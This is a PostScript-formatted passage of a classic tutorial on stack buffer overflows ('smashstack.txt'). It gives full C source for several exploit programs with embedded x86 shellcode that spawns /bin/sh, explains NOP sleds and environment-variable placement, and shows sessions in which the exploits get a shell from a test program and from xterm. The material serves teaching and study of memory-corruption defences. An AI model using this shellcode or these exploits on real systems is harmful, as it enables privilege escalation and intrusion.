402 506 M
(  "\\x89\\xf3\\x8d\\x4e\\x08\\x8d\\x56\\x0c\\xcd\\x80\\x31\\xdb\\x89\\xd8\\x40\\xcd") s
402 498 M
(  "\\x80\\xe8\\xdc\\xff\\xff\\xff/bin/sh";) s
402 482 M
(unsigned long get_sp\(void\) {) s
402 474 M
(   __asm__\("movl %esp,%eax"\);) s
402 466 M
(}) s
402 450 M
(void main\(int argc, char *argv[]\) {) s
402 442 M
(  char *buff, *ptr;) s
402 434 M
(  long *addr_ptr, addr;) s
402 426 M
(  int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;) s
402 418 M
(  int i;) s
402 402 M
(  if \(argc > 1\) bsize  = atoi\(argv[1]\);) s
402 394 M
(  if \(argc > 2\) offset = atoi\(argv[2]\);) s
402 378 M
(  if \(!\(buff = malloc\(bsize\)\)\) {) s
402 370 M
(    printf\("Can't allocate memory.\\n"\);) s
402 362 M
(    exit\(0\);) s
402 354 M
(  }) s
402 338 M
(  addr = get_sp\(\) - offset;) s
402 330 M
(  printf\("Using address: 0x%x\\n", addr\);) s
402 314 M
(  ptr = buff;) s
402 306 M
(  addr_ptr = \(long *\) ptr;) s
402 298 M
(  for \(i = 0; i < bsize; i+=4\)) s
402 290 M
(    *\(addr_ptr++\) = addr;) s
402 274 M
(  ptr += 4;) s
402 266 M
(  for \(i = 0; i < strlen\(shellcode\); i++\)) s
402 258 M
(    *\(ptr++\) = shellcode[i];) s
402 242 M
(  buff[bsize - 1] = '\\0';) s
402 226 M
(  memcpy\(buff,"EGG=",4\);) s
402 218 M
(  putenv\(buff\);) s
402 210 M
(  system\("/bin/bash"\);) s
402 202 M
(}) s
402 194 M
(------------------------------------------------------------------------------) s
402 178 M
(   Now we can try to guess what the buffer and offset should be:) s
402 162 M
(------------------------------------------------------------------------------) s
402 154 M
([aleph1]$ ./exploit2 500) s
402 146 M
(Using address: 0xbffffdb4) s
402 138 M
([aleph1]$ ./vulnerable $EGG) s
402 130 M
([aleph1]$ exit) s
402 122 M
([aleph1]$ ./exploit2 600) s
402 114 M
(Using address: 0xbffffdb4) s
402 106 M
([aleph1]$ ./vulnerable $EGG) s
402 98 M
(Illegal instruction) s
402 90 M
([aleph1]$ exit) s
402 82 M
([aleph1]$ ./exploit2 600 100) s
402 74 M
(Using address: 0xbffffd4c) s
402 66 M
([aleph1]$ ./vulnerable $EGG) s
402 58 M
(Segmentation fault) s
402 50 M
([aleph1]$ exit) s
402 42 M
([aleph1]$ ./exploit2 600 200) s
402 34 M
(Using address: 0xbffffce8) s
402 26 M
([aleph1]$ ./vulnerable $EGG) s
402 18 M
(Segmentation fault) s
402 10 M
([aleph1]$ exit) s
402 2 M
(.) s
_R
S
%%Page: (9) 9
%%BeginPageSetup
_S
90 rotate
24 -571 translate
/pagenum 9 def
/fname (smashstack.txt) def
/fdir () def
/ftail (smashstack.txt) def
% User defined strings:
/fmodstr (Wed Mar 15 17:26:04 2006) def
/pagenumstr (9) def
/user_header_p false def
/user_footer_p false def
%%EndPageSetup
do_header
5 522 M
(.) s
5 514 M
(.) s
5 506 M
([aleph1]$ ./exploit2 600 1564) s
5 498 M
(Using address: 0xbffff794) s
5 490 M
([aleph1]$ ./vulnerable $EGG) s
5 482 M
($) s
5 474 M
(------------------------------------------------------------------------------) s
5 458 M
(   As we can see this is not an efficient process.  Trying to guess the) s
5 450 M
(offset even while knowing where the beginning of the stack lives is nearly) s
5 442 M
(impossible.  We would need at best a hundred tries, and at worst a couple of) s
5 434 M
(thousand.  The problem is we need to guess *exactly* where the address of our ) s
5 426 M
(code will start.  If we are off by one byte more or less we will just get a) s
5 418 M
(segmentation violation or a invalid instruction.  One way to increase our) s
5 410 M
(chances is to pad the front of our overflow buffer with NOP instructions.) s
5 402 M
(Almost all processors have a NOP instruction that performs a null operation.) s
5 394 M
(It is usually used to delay execution for purposes of timing.  We will take) s
5 386 M
(advantage of it and fill half of our overflow buffer with them.  We will place) s
5 378 M
(our shellcode at the center, and then follow it with the return addresses. If) s
5 370 M
(we are lucky and the return address points anywhere in the string of NOPs,) s
5 362 M
(they will just get executed until they reach our code.  In the Intel) s
5 354 M
(architecture the NOP instruction is one byte long and it translates to 0x90) s
5 346 M
(in machine code.  Assuming the stack starts at address 0xFF, that S stands for) s
5 338 M
(shell code, and that N stands for a NOP instruction the new stack would look) s
5 330 M
(like this:) s
5 314 M
(bottom of  DDDDDDDDEEEEEEEEEEEE  EEEE  FFFF  FFFF  FFFF  FFFF     top of) s
5 306 M
(memory     89ABCDEF0123456789AB  CDEF  0123  4567  89AB  CDEF     memory) s
5 298 M
(           buffer                sfp   ret   a     b     c) s
5 282 M
(<------   [NNNNNNNNNNNSSSSSSSSS][0xDE][0xDE][0xDE][0xDE][0xDE]) s
5 274 M
(                 ^                     |) s
5 266 M
(                 |_____________________|) s
5 258 M
(top of                                                            bottom of) s
5 250 M
(stack                                                                 stack) s
5 234 M
(   The new exploits is then:) s
5 218 M
(exploit3.c) s
5 210 M
(------------------------------------------------------------------------------) s
5 202 M
(#include <stdlib.h>) s
5 186 M
(#define DEFAULT_OFFSET                    0) s
5 178 M
(#define DEFAULT_BUFFER_SIZE             512) s
5 170 M
(#define NOP                            0x90) s
5 154 M
(char shellcode[] =) s
5 146 M
(  "\\xeb\\x1f\\x5e\\x89\\x76\\x08\\x31\\xc0\\x88\\x46\\x07\\x89\\x46\\x0c\\xb0\\x0b") s
5 138 M
(  "\\x89\\xf3\\x8d\\x4e\\x08\\x8d\\x56\\x0c\\xcd\\x80\\x31\\xdb\\x89\\xd8\\x40\\xcd") s
5 130 M
(  "\\x80\\xe8\\xdc\\xff\\xff\\xff/bin/sh";) s
5 114 M
(unsigned long get_sp\(void\) {) s
5 106 M
(   __asm__\("movl %esp,%eax"\);) s
5 98 M
(}) s
5 82 M
(void main\(int argc, char *argv[]\) {) s
5 74 M
(  char *buff, *ptr;) s
5 66 M
(  long *addr_ptr, addr;) s
5 58 M
(  int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;) s
5 50 M
(  int i;) s
5 34 M
(  if \(argc > 1\) bsize  = atoi\(argv[1]\);) s
5 26 M
(  if \(argc > 2\) offset = atoi\(argv[2]\);) s
5 10 M
(  if \(!\(buff = malloc\(bsize\)\)\) {) s
5 2 M
(    printf\("Can't allocate memory.\\n"\);) s
402 522 M
(    exit\(0\);) s
402 514 M
(  }) s
402 498 M
(  addr = get_sp\(\) - offset;) s
402 490 M
(  printf\("Using address: 0x%x\\n", addr\);) s
402 474 M
(  ptr = buff;) s
402 466 M
(  addr_ptr = \(long *\) ptr;) s
402 458 M
(  for \(i = 0; i < bsize; i+=4\)) s
402 450 M
(    *\(addr_ptr++\) = addr;) s
402 434 M
(  for \(i = 0; i < bsize/2; i++\)) s
402 426 M
(    buff[i] = NOP;) s
402 410 M
(  ptr = buff + \(\(bsize/2\) - \(strlen\(shellcode\)/2\)\);) s
402 402 M
(  for \(i = 0; i < strlen\(shellcode\); i++\)) s
402 394 M
(    *\(ptr++\) = shellcode[i];) s
402 378 M
(  buff[bsize - 1] = '\\0';) s
402 362 M
(  memcpy\(buff,"EGG=",4\);) s
402 354 M
(  putenv\(buff\);) s
402 346 M
(  system\("/bin/bash"\);) s
402 338 M
(}) s
402 330 M
(------------------------------------------------------------------------------) s
402 314 M
(   A good selection for our buffer size is about 100 bytes more than the size) s
402 306 M
(of the buffer we are trying to overflow.  This will place our code at the end) s
402 298 M
(of the buffer we are trying to overflow, giving a lot of space for the NOPs,) s
402 290 M
(but still overwriting the return address with the address we guessed.  The) s
402 282 M
(buffer we are trying to overflow is 512 bytes long, so we'll use 612.  Let's) s
402 274 M
(try to overflow our test program with our new exploit:) s
402 258 M
(------------------------------------------------------------------------------) s
402 250 M
([aleph1]$ ./exploit3 612) s
402 242 M
(Using address: 0xbffffdb4) s
402 234 M
([aleph1]$ ./vulnerable $EGG) s
402 226 M
($) s
402 218 M
(------------------------------------------------------------------------------) s
402 202 M
(   Whoa!  First try!  This change has improved our chances a hundredfold. ) s
402 194 M
(Let's try it now on a real case of a buffer overflow.  We'll use for our) s
402 186 M
(demonstration the buffer overflow on the Xt library.  For our example, we'll ) s
402 178 M
(use xterm \(all programs linked with the Xt library are vulnerable\). You must) s
402 170 M
(be running an X server and allow connections to it from the localhost.  Set) s
402 162 M
(your DISPLAY variable accordingly.) s
402 146 M
(------------------------------------------------------------------------------) s
402 138 M
([aleph1]$ export DISPLAY=:0.0) s
402 130 M
([aleph1]$ ./exploit3 1124) s
402 122 M
(Using address: 0xbffffdb4) s
402 114 M
([aleph1]$ /usr/X11R6/bin/xterm -fg $EGG) s
402 106 M
(Warning: Color name "\353^1\244FF) s
402 98 M
(                           \260) s
402 90 M
(                            \363V) s
402 74 M
(\2441\244\330@\244\350\334\377\377\377/bin/sh\244\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244\377) s
402 66 M
(\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244\377) s
402 58 M
(\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244) s
_R
S
%%Page: (10) 10
%%BeginPageSetup
_S
90 rotate
24 -571 translate
/pagenum 10 def
/fname (smashstack.txt) def
/fdir () def
/ftail (smashstack.txt) def
% User defined strings:
/fmodstr (Wed Mar 15 17:26:04 2006) def
/pagenumstr (10) def
/user_header_p false def
/user_footer_p false def
%%EndPageSetup
do_header
5 514 M
(\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244) s
5 506 M
(\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244) s
5 498 M
(\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244) s
5 426 M
(\244\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244\377\377\277\244\244\377\277\244\244\377\277\244\244\377\277\244\244) s
5 418 M
(^C) s
5 410 M
([aleph1]$ exit) s
5 402 M
([aleph1]$ ./exploit3 2148 100) s
5 394 M
(Using address: 0xbffffd48) s
5 386 M
([aleph1]$ /usr/X11R6/bin/xterm -fg $EGG) s
5 378 M
(Warning: Color name "\353^1\244FF) s
5 370 M
(                           \260) s
5 362 M
(                            \363V) s
5 346 M
(\2441\244\330@\244\350\334\377\377\377/bin/sh\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377) s
5 338 M
(\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377) s
5 330 M
(\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244) s
5 258 M
(\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244) s
5 250 M
(\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244) s
5 242 M
(\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H) s
5 170 M
(\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H) s
5 162 M
(\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H) s
5 154 M
(\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277) s
5 82 M
(H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277) s
5 74 M
(H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277) s
5 66 M
(H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377) s
402 522 M
(\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377\277H\244\377) s
402 514 M
(Warning: some arguments in previous message were lost) s
402 506 M
(Illegal instruction) s
402 498 M
([aleph1]$ exit) s
402 490 M
(.) s
402 482 M
(.) s
402 474 M
(.) s
402 466 M
([aleph1]$ ./exploit4 2148 600) s
402 458 M
(Using address: 0xbffffb54) s
402 450 M
([aleph1]$ /usr/X11R6/bin/xterm -fg $EGG) s
402 442 M
(Warning: Color name "\353^1\244FF) s
402 434 M
(                           \260) s
402 426 M
(                            \363V) s
402 410 M
(\2441\244\330@\244\350\334\377\377\377/bin/sh\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377) s
402 402 M
(\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377) s
402 394 M
(\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373) s
402 322 M
(\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373) s
402 314 M
(\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373) s
402 306 M
(\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T) s
402 234 M
(\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T) s
402 226 M
(\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T) s
402 218 M
(\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277) s
402 146 M
(T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277) s
402 138 M
(T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277) s
402 130 M
(T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377) s
402 58 M
(\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377\277T\373\377) s
402 50 M
(Warning: some arguments in previous message were lost) s
402 42 M
(bash$) s
402 34 M
(------------------------------------------------------------------------------) s
402 18 M
(   Eureka! Less than a dozen tries and we found the magic numbers. If xterm) s
402 10 M
(where installed suid root this would now be a root shell.) s
_R
S
%%Page: (11) 11
%%BeginPageSetup
_S
90 rotate
24 -571 translate
/pagenum 11 def
/fname (smashstack.txt) def
/fdir () def
/ftail (smashstack.txt) def
% User defined strings:
/fmodstr (Wed Mar 15 17:26:04 2006) def
/pagenumstr (11) def
/user_header_p false def
/user_footer_p false def
%%EndPageSetup
do_header
5 514 M
(                            Small Buffer Overflows) s
5 506 M
(                            ~~~~~~~~~~~~~~~~~~~~~~) s
5 490 M
(   There will be times when the buffer you are trying to overflow is so) s
5 482 M
(small that either the shellcode wont fit into it, and it will overwrite the) s
5 474 M
(return address with instructions instead of the address of our code, or the) s
5 466 M
(number of NOPs you can pad the front of the string with is so small that the) s
5 458 M
(chances of guessing their address is minuscule.  To obtain a shell from these) s
5 450 M
(programs we will have to go about it another way.  This particular approach) s
5 442 M
(only works when you have access to the program's environment variables.) s
5 426 M
(   What we will do is place our shellcode in an environment variable, and) s
5 418 M
(then overflow the buffer with the address of this variable in memory.  This) s
5 410 M
(method also increases your changes of the exploit working as you can make) s
5 402 M
(the environment variable holding the shell code as large as you want.) s
5 386 M
(   The environment variables are stored in the top of the stack when the) s
5 378 M
(program is started, any modification by setenv\(\) are then allocated) s
5 370 M
(elsewhere.  The stack at the beginning then looks like this:) s
5 346 M
(      <strings><argv pointers>NULL<envp pointers>NULL<argc><argv><envp>) s
5 330 M
(   Our new program will take an extra variable, the size of the variable) s
5 322 M
(containing the shellcode and NOPs. Our new exploit now looks like this:) s
5 306 M
(exploit4.c) s
5 298 M
(------------------------------------------------------------------------------) s
5 290 M
(#include <stdlib.h>) s
5 274 M
(#define DEFAULT_OFFSET                    0) s
5 266 M
(#define DEFAULT_BUFFER_SIZE             512) s
5 258 M
(#define DEFAULT_EGG_SIZE               2048) s
5 250 M
(#define NOP                            0x90) s
5 234 M
(char shellcode[] =) s
5 226 M
(  "\\xeb\\x1f\\x5e\\x89\\x76\\x08\\x31\\xc0\\x88\\x46\\x07\\x89\\x46\\x0c\\xb0\\x0b") s
5 218 M
(  "\\x89\\xf3\\x8d\\x4e\\x08\\x8d\\x56\\x0c\\xcd\\x80\\x31\\xdb\\x89\\xd8\\x40\\xcd") s
5 210 M
(  "\\x80\\xe8\\xdc\\xff\\xff\\xff/bin/sh";) s
5 194 M
(unsigned long get_esp\(void\) {) s
5 186 M
(   __asm__\("movl %esp,%eax"\);) s
5 178 M
(}) s
5 162 M
(void main\(int argc, char *argv[]\) {) s
5 154 M
(  char *buff, *ptr, *egg;) s
5 146 M
(  long *addr_ptr, addr;) s
5 138 M
(  int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;) s
5 130 M
(  int i, eggsize=DEFAULT_EGG_SIZE;) s
5 114 M
(  if \(argc > 1\) bsize   = atoi\(argv[1]\);) s
5 106 M
(  if \(argc > 2\) offset  = atoi\(argv[2]\);) s
5 98 M
(  if \(argc > 3\) eggsize = atoi\(argv[3]\);) s
5 74 M
(  if \(!\(buff = malloc\(bsize\)\)\) {) s
5 66 M
(    printf\("Can't allocate memory.\\n"\);) s
5 58 M
(    exit\(0\);) s
5 50 M
(  }) s
5 42 M
(  if \(!\(egg = malloc\(eggsize\)\)\) {) s
5 34 M
(    printf\("Can't allocate memory.\\n"\);) s
5 26 M
(    exit\(0\);) s
5 18 M
(  }) s
5 2 M
(  addr = get_esp\(\) - offset;) s
402 522 M
(  printf\("Using address: 0x%x\\n", addr\);) s
402 506 M
(  ptr = buff;) s
402 498 M
(  addr_ptr = \(long *\) ptr;) s
402 490 M
(  for \(i = 0; i < bsize; i+=4\)) s
402 482 M
(    *\(addr_ptr++\) = addr;) s
402 466 M
(  ptr = egg;) s
402 458 M
(  for \(i = 0; i < eggsize - strlen\(shellcode\) - 1; i++\)) s
402 450 M
(    *\(ptr++\) = NOP;) s
402 434 M
(  for \(i = 0; i < strlen\(shellcode\); i++\)) s
402 426 M
(    *\(ptr++\) = shellcode[i];) s
402 410 M
(  buff[bsize - 1] = '\\0';) s
402 402 M
(  egg[eggsize - 1] = '\\0';) s
402 386 M
(  memcpy\(egg,"EGG=",4\);) s
402 378 M
(  putenv\(egg\);) s
402 370 M
(  memcpy\(buff,"RET=",4\);) s
402 362 M
(  putenv\(buff\);) s
402 354 M
(  system\("/bin/bash"\);) s
402 346 M
(}) s
402 338 M
(------------------------------------------------------------------------------) s
402 322 M
(   Lets try our new exploit with our vulnerable test program:) s
402 306 M
(------------------------------------------------------------------------------) s
402 298 M
([aleph1]$ ./exploit4 768) s
402 290 M
(Using address: 0xbffffdb0) s
402 282 M
([aleph1]$ ./vulnerable $RET) s
402 274 M
($) s
402 266 M
(------------------------------------------------------------------------------) s
402 250 M
(   Works like a charm. Now lets try it on xterm:) s
402 234 M
(------------------------------------------------------------------------------) s
402 226 M
([aleph1]$ export DISPLAY=:0.0) s
402 218 M
([aleph1]$ ./exploit4 2148) s
402 210 M
(Using address: 0xbffffdb0) s
402 202 M
([aleph1]$ /usr/X11R6/bin/xterm -fg $RET) s
402 194 M
(Warning: Color name) s
402 186 M
("\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377) s
402 178 M
(\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377) s
402 170 M
(\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244) s
402 98 M
(\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244) s
402 90 M
(\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244) s
402 82 M
(\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260) s
402 10 M
(\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260) s
402 2 M
(\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260) s
_R
S
%%Page: (12) 12
%%BeginPageSetup
_S
90 rotate
24 -571 translate
/pagenum 12 def
/fname (smashstack.txt) def
/fdir () def
/ftail (smashstack.txt) def
% User defined strings:
/fmodstr (Wed Mar 15 17:26:04 2006) def
/pagenumstr (12) def
/user_header_p false def
/user_footer_p false def
%%EndPageSetup
do_header
5 522 M
(\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277) s
5 450 M
(\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277) s
5 442 M
